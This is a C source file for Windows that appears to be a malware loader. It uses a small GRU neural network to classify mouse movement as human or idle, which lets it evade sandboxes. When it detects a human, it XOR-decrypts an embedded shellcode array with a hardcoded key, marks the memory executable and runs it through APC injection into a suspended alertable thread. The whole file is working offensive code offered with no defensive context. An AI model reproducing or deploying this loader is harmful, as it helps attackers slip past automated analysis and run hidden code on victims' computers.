#include <stdio.h>
#include <math.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include "model_weights.h" 

#define PI              3.14159265358979323846f
#define NUM_PHASES      3    
#define PHASE_DURATION  10   
#define SAMPLE_RATE_HZ  10   
#define SAMPLES_PER_PHASE  (PHASE_DURATION * SAMPLE_RATE_HZ)
#define CLASS_HUMAN  0
#define CLASS_IDLE   1
#pragma warning(disable: 4305)

unsigned char payload[] = {

    0xB2, 0x21, 0xD1, 0x92, 0xB1, 0x86, 0x81, 0x4E, 0x69, 0x52,
    0x37, 0x10, 0x2F, 0x11, 0x1C, 0x38, 0x04, 0x3E, 0x70, 0xBC,
    0x24, 0x06, 0xE2, 0x00, 0x16, 0x09, 0xE5, 0x13, 0x56, 0x21,
    0xD9, 0x24, 0x61, 0x26, 0xCA, 0x3C, 0x39, 0x1A, 0x79, 0xF6,
    0x24, 0x0B, 0x03, 0x58, 0x9B, 0x3E, 0x70, 0xAE, 0xED, 0x72,
    0x08, 0x2E, 0x74, 0x6D, 0x4E, 0x00, 0x8F, 0xA0, 0x5F, 0x37,
    0x40, 0xAF, 0xA3, 0xA3, 0x3B, 0x13, 0x27, 0x09, 0xE5, 0x13,
    0x6E, 0xE2, 0x10, 0x4A, 0x09, 0x6F, 0x91, 0xC5, 0xE9, 0xDA,
    0x76, 0x41, 0x6E, 0x09, 0xCB, 0xA9, 0x26, 0x11, 0x09, 0x6F,
    0x91, 0x1E, 0xE2, 0x1A, 0x6E, 0x05, 0xE5, 0x01, 0x6E, 0x20,
    0x53, 0xA6, 0xA2, 0x38, 0x09, 0xB1, 0xA0, 0x13, 0xFD, 0x75,
    0xE6, 0x09, 0x4F, 0xBF, 0x1F, 0x47, 0x88, 0x26, 0x70, 0x8E,
    0xC5, 0x13, 0xB7, 0x88, 0x63, 0x00, 0x4F, 0xA8, 0x6A, 0x96,
    0x34, 0x9F, 0x0D, 0x4D, 0x25, 0x76, 0x7E, 0x04, 0x57, 0x90,
    0x3B, 0xB1, 0x0A, 0x32, 0xCA, 0x2E, 0x65, 0x07, 0x68, 0x82,
    0x10, 0x00, 0xE5, 0x4D, 0x06, 0x2D, 0xD9, 0x36, 0x5D, 0x27,
    0x40, 0x9E, 0x28, 0xD9, 0x72, 0xC9, 0x26, 0x40, 0x9E, 0x28,
    0x0A, 0x37, 0x19, 0x30, 0x18, 0x14, 0x28, 0x0A, 0x37, 0x18,
    0x2F, 0x1B, 0x06, 0xEA, 0xBE, 0x56, 0x00, 0x3C, 0xBE, 0xAE,
    0x31, 0x13, 0x2F, 0x1B, 0x26, 0xCA, 0x5C, 0x80, 0x05, 0x89,
    0xBE, 0x91, 0x1C, 0x06, 0xD3, 0x53, 0x76, 0x41, 0x6E, 0x41,
    0x4E, 0x69, 0x52, 0x3E, 0xCC, 0xE3, 0x40, 0x4F, 0x69, 0x52,
    0x37, 0xFB, 0x5F, 0xCA, 0x21, 0xEE, 0xAD, 0xA3, 0xFA, 0x9E,
    0xF4, 0xEC, 0x3F, 0x13, 0xCC, 0xE7, 0xFB, 0xFC, 0xD3, 0x96,
    0x87, 0x3E, 0xC2, 0xAA, 0x69, 0x72, 0x6F, 0x2E, 0x7C, 0xC1,
    0x95, 0xA1, 0x3B, 0x6C, 0xE9, 0x31, 0x52, 0x1C, 0x2E, 0x24,
    0x69, 0x0B, 0x37, 0xC8, 0xB4, 0xBE, 0x9B, 0x0A, 0x33, 0x1A,
    0x22, 0x40, 0x24, 0x36, 0x0C, 0x52
};


unsigned int payload_len = sizeof(payload);

char my_secrect_key[] = "NiRvAnA";

void XOR(unsigned char* data, size_t data_len, char* key, size_t key_len) {
    int j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

DWORD WINAPI AlertableThread(LPVOID lpParam) {
    printf("[+] Thread entered alertable state...\n");
    SleepEx(INFINITE, TRUE);
    return 0;
}


BOOL RunViaApcInjection(HANDLE hThread, PBYTE pPayload, SIZE_T sPayloadSize)
{

    PVOID pAddress = NULL;
    DWORD dwOldProtection = NULL;


    pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    XOR((char*)pPayload, sPayloadSize, my_secrect_key, sizeof(my_secrect_key));

    if (pAddress == NULL) {
        printf("\t[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    memcpy(pAddress, pPayload, sPayloadSize);


    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("\t[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
        printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

static inline float sigmoid(float x)
{
    return 1.0f / (1.0f + expf(-x));
}

static inline float tanh_activation(float x)
{
    return tanhf(x);
}

static void compute_softmax(const float logits[NUM_CLASSES],
    float probabilities[NUM_CLASSES])
{
    
    float max_logit = logits[0];
    for (int i = 1; i < NUM_CLASSES; i++) {
        if (logits[i] > max_logit)
            max_logit = logits[i];
    }

    float sum = 0.0f;
    for (int i = 0; i < NUM_CLASSES; i++) {
        probabilities[i] = expf(logits[i] - max_logit);
        sum += probabilities[i];
    }

    for (int i = 0; i < NUM_CLASSES; i++)
        probabilities[i] /= sum;
}

static void run_gru_inference(const float raw_seq[SEQ_LENGTH][INPUT_SIZE],
    float output_logits[NUM_CLASSES])
{
    float h[HIDDEN_SIZE] = { 0.0f };  
    float next_h[HIDDEN_SIZE] = { 0.0f };  

    float scaled[SEQ_LENGTH][INPUT_SIZE];

    for (int t = 0; t < SEQ_LENGTH; t++) {
        float accel = raw_seq[t][2];
        float jerk = raw_seq[t][3];

        float log_accel = (accel > 0.0f ? 1.0f : accel < 0.0f ? -1.0f : 0.0f)
            * log1pf(fabsf(accel));
        float log_jerk = (jerk > 0.0f ? 1.0f : jerk < 0.0f ? -1.0f : 0.0f)
            * log1pf(fabsf(jerk));

        scaled[t][0] = (raw_seq[t][0] - SCALER_MEAN[0]) / SCALER_STD[0]; 
        scaled[t][1] = (raw_seq[t][1] - SCALER_MEAN[1]) / SCALER_STD[1]; 
        scaled[t][2] = (log_accel - SCALER_MEAN[2]) / SCALER_STD[2]; 
        scaled[t][3] = (log_jerk - SCALER_MEAN[3]) / SCALER_STD[3]; 

        for (int i = 4; i < INPUT_SIZE; i++)
            scaled[t][i] = (raw_seq[t][i] - SCALER_MEAN[i]) / SCALER_STD[i];
    }

    for (int t = 0; t < SEQ_LENGTH; t++) {
        for (int j = 0; j < HIDDEN_SIZE; j++) {
            const int r_idx = j;
            const int z_idx = j + HIDDEN_SIZE;
            const int n_idx = j + 2 * HIDDEN_SIZE;

            float r_gate = gru_bias_ih_l0[r_idx] + gru_bias_hh_l0[r_idx];
            float z_gate = gru_bias_ih_l0[z_idx] + gru_bias_hh_l0[z_idx];
            float n_gate = gru_bias_ih_l0[n_idx] + gru_bias_hh_l0[n_idx];

            for (int i = 0; i < INPUT_SIZE; i++) {
                r_gate += scaled[t][i] * gru_weight_ih_l0[r_idx][i];
                z_gate += scaled[t][i] * gru_weight_ih_l0[z_idx][i];
                n_gate += scaled[t][i] * gru_weight_ih_l0[n_idx][i];
            }

            float r_hid = 0.0f, z_hid = 0.0f, n_hid = 0.0f;
            for (int i = 0; i < HIDDEN_SIZE; i++) {
                r_hid += h[i] * gru_weight_hh_l0[r_idx][i];
                z_hid += h[i] * gru_weight_hh_l0[z_idx][i];
                n_hid += h[i] * gru_weight_hh_l0[n_idx][i];
            }

            float rt = sigmoid(r_gate + r_hid);
            float zt = sigmoid(z_gate + z_hid);
            float nt = tanh_activation(n_gate + rt * n_hid);

            next_h[j] = (1.0f - zt) * nt + zt * h[j];
        }

        memcpy(h, next_h, sizeof(h));
    }


    for (int c = 0; c < NUM_CLASSES; c++) {
        output_logits[c] = fc_bias[c];
        for (int j = 0; j < HIDDEN_SIZE; j++)
            output_logits[c] += h[j] * fc_weight[c][j];
    }
}

static int argmax(const float array[], int size)
{
    int   best_idx = 0;
    float best_val = array[0];

    for (int i = 1; i < size; i++) {
        if (array[i] > best_val) {
            best_val = array[i];
            best_idx = i;
        }
    }
    return best_idx;
}

static int run_analysis_phase(int phase_id)
{

    float window[SEQ_LENGTH][INPUT_SIZE] = { { 0.0f } };

    float output_logits[NUM_CLASSES] = { 0.0f };
    float probabilities[NUM_CLASSES] = { 0.0f };

    POINT cursor = { 0 };
    GetCursorPos(&cursor);

    long  last_x = cursor.x;
    long  last_y = cursor.y;
    float last_speed = 0.0f;
    float last_accel = 0.0f;
    float last_angle = 0.0f;
    int   idle_streak = 0;

    printf("[*] Phase [%d/%d]  Collecting %d samples at %d Hz ...\n",
        phase_id, NUM_PHASES, SAMPLES_PER_PHASE, SAMPLE_RATE_HZ);

    for (int s = 0; s < SAMPLES_PER_PHASE; s++) {
        Sleep(1000 / SAMPLE_RATE_HZ);  
        GetCursorPos(&cursor);

        long vx = cursor.x - last_x;
        long vy = cursor.y - last_y;

        float distance = sqrtf((float)(vx * vx + vy * vy));
        float speed = distance / 0.1f;
        float acceleration = (speed - last_speed) / 0.1f;
        float jerk = (acceleration - last_accel) / 0.1f;
        float angle = atan2f((float)vy, (float)vx) * (180.0f / PI);
        float angular_velocity = (angle - last_angle) / 0.1f;
        int   idle = (distance == 0.0f) ? 1 : 0;
        idle_streak = idle ? (idle_streak + 1) : 0;

        for (int i = 0; i < SEQ_LENGTH - 1; i++)
            memcpy(window[i], window[i + 1], sizeof(float) * INPUT_SIZE);

        int slot = SEQ_LENGTH - 1;
        window[slot][0] = distance;
        window[slot][1] = speed;
        window[slot][2] = acceleration;
        window[slot][3] = jerk;
        window[slot][4] = angle;
        window[slot][5] = angular_velocity;
        window[slot][6] = (float)vx;
        window[slot][7] = (float)vy;
        window[slot][8] = (float)idle;
        window[slot][9] = (float)idle_streak;

        last_x = cursor.x;
        last_y = cursor.y;
        last_speed = speed;
        last_accel = acceleration;
        last_angle = angle;
    }

    run_gru_inference(window, output_logits);
    compute_softmax(output_logits, probabilities);

    int verdict = argmax(output_logits, NUM_CLASSES);

    printf("    Logits  : [C0=%.4f  C1=%.4f]\n",
        output_logits[0], output_logits[1]);
    printf("    Probs   : [Human=%.1f%%  Idle=%.1f%%]\n",
        probabilities[CLASS_HUMAN] * 100.0f,
        probabilities[CLASS_IDLE] * 100.0f);
    printf("    Decision: Class %d\n\n", verdict);

    return verdict;
}

int main(void)
{

    printf("[*] GRU Mouse Behaviour Analysis \n");
    printf("[*] Phases : %d  |  Duration per phase : %d s  |  Total : %d s\n",NUM_PHASES, PHASE_DURATION, NUM_PHASES * PHASE_DURATION);

    
    int votes[NUM_PHASES] = { 0 };
    for (int i = 0; i < NUM_PHASES; i++)
        votes[i] = run_analysis_phase(i + 1);


    int tally[2] = { 0, 0 };
    for (int i = 0; i < NUM_PHASES; i++)
        tally[votes[i]]++;

    int final_verdict = CLASS_HUMAN;
    if (tally[CLASS_IDLE] > tally[final_verdict]) final_verdict = CLASS_IDLE;

    if (final_verdict == CLASS_HUMAN) {
     
        printf("  [PASS]  Human interaction confirmed.\n");

        HANDLE hThread = CreateThread(
            NULL,
            0,
            AlertableThread,  
            NULL,
            CREATE_SUSPENDED, 
            NULL
        );

        if (!hThread) {
            printf("[!] Thread creation failed\n");
            return -1;
        }

        if (RunViaApcInjection(hThread, payload, payload_len)) {
           
            ResumeThread(hThread);
            WaitForSingleObject(hThread, INFINITE);
            printf("[+] Payload injected successfully via APC.\n");

        }
        else {
            printf("[!] Payload injection failed.\n");
        }
    }
    else {
        printf("IDLE DETECTED\n");
        printf("[!] System appears idle. Payload execution aborted.\n");
    }
    return 0;
}
